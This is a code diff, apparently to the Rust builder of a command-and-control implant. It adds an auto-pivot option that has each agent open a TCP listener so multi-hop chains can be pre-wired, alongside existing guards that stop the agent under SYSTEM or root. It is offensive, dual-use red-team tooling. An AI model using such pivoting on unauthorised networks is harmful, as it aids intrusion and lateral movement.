@@ -75,6 +75,20 @@ struct Cli {
     #[arg(long)]                           guard_hours:       Option<String>,
     /// Exit if the agent is running as SYSTEM / root.
     #[arg(long, default_value_t = false)]  guard_no_system:   bool,
+    // ── Pivot auto-cascade ────────────────────────────────────────────
+    /// TCP port the agent will automatically listen on for the next pivot
+    /// hop immediately after its session handshake completes.
+    ///
+    /// Use this to pre-wire multi-hop chains at build time:
+    ///
+    ///   hop1: no --auto-pivot-port  (operator starts listener manually)
+    ///   hop2: --auto-pivot-port 5002
+    ///   hop3: --auto-pivot-port 5003
+    ///   hop4: no --auto-pivot-port  (leaf node, no downstream)
+    ///
+    /// Omit (default) to disable — leaf nodes and direct-connect agents
+    /// do not need this flag.
+    #[arg(long)]                           auto_pivot_port:   Option<u16>,
 }
 
 #[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug)]
@@ -272,6 +286,11 @@ fn main() -> Result<()> {
     let hash_salt = Uuid::new_v4().to_string();
     println!("[*] Build ID:     {}", build_id);
 
+    // Log auto-cascade pivot port if configured
+    if let Some(port) = cli.auto_pivot_port {
+        println!("[*] Auto-pivot:   :{} (cascade listener starts on session connect)", port);
+    }
+
     // ── Crypto setup ──────────────────────────────────────────────────
     let mut csprng = OsRng;
     let signing_key = SigningKey::generate(&mut csprng);
@@ -360,6 +379,10 @@ fn main() -> Result<()> {
         "guard_hour_start":  guard_hour_start,
         "guard_hour_end":    guard_hour_end,
         "guard_no_system":   cli.guard_no_system,
+        // ── Pivot auto-cascade ────────────────────────────────────────
+        // null when not set — the agent's #[serde(default)] treats null
+        // and missing identically, so existing builds are unaffected.
+        "auto_pivot_port":   cli.auto_pivot_port,
     }).to_string();
 
     println!("[*] Encrypting configuration...");
